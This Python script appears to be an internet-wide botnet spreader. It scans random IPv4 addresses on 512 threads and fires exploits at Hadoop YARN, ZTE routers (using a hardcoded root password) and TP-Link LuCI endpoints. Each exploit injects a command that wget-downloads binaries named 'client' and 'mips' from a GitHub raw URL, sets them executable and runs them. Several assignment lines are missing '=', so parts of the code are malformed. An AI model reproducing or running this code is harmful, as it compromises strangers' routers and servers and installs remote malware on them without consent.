import threading
import time
import subprocess
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor
import fileinput
import random
import requests

thread_limit = threading.Semaphore(512)

yarn_payload "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client; chmod 777 client; ./client"
login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."
command_payload = "&Host=;$(cd /tmp;wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"
luci_payload "`cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips`"
tplink_payload "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"

def generate_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

#x64 [client]
def yarn_exploit(ip):
    try:
        target = f'http://{ip}:8088/'
        url = target + 'ws/v1/cluster/apps/new-application'
        resp = requests.post(url)
        app_id = resp.json().get('application-id')
        if app_id:
            url = target + 'ws/v1/cluster/apps'
            data = {
                'application-id': app_id,
                'application-name': 'get-shell',
                'am-container-spec': {
                    'commands': {
                        'command': '%s' % yarn_payload,
                    },
                },
                'application-type': 'YARN',
            }
            requests.post(url, json=data)
            print(f"[YARN] Exploited {ip}")
    except Exception as e:
        pass

#mips [mips]
def zte_exploit(ip):
    try:
        url = f"http://{ip}:8083/login.gch"
        url2 = f"http://{ip}:8083/manager_dev_ping_t.gch"
        url3 = f"http://{ip}:8083/getpage.gch?pid=1001&logout=1"
        requests.post(url, timeout=3, data=login_payload)
        requests.post(url2, timeout=2.5, data=command_payload)
        requests.get(url3, timeout=2.5)
        print(f"[ZTE] Exploited {ip}")
    except Exception:
        pass

#mips [mips]
def luci_exploit(ip):
    try:
        req = urllib.request.Request(f"http://{ip}/cgi-bin/luci/;stok=/locale?form=country")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        body = f"operation=write&country=$(id>{luci_payload})"
        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'), timeout=10)
        if response.status == 200:
            print(f"[LUCI] Exploited {ip}")
    except Exception:
        pass

#mips [mips]
def tplink_exploit(ip):
    try:
        url = f"https://{ip}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$("{tplink_payload}")"
        requests.get(url, verify=False)
        requests.get(url, verify=False)
        print(f"[TP-Link] Exploited {ip}")
    except Exception:
        pass

def execute_exploits(ip):
    with thread_limit:
        yarn_exploit(ip)
        zte_exploit(ip)
        luci_exploit(ip)
        tplink_exploit(ip)

def main():
    with ThreadPoolExecutor(max_workers=512) as executor:
        while True:
            ip = generate_ip()
            executor.submit(execute_exploits, ip)

if __name__ == "__main__":
    main()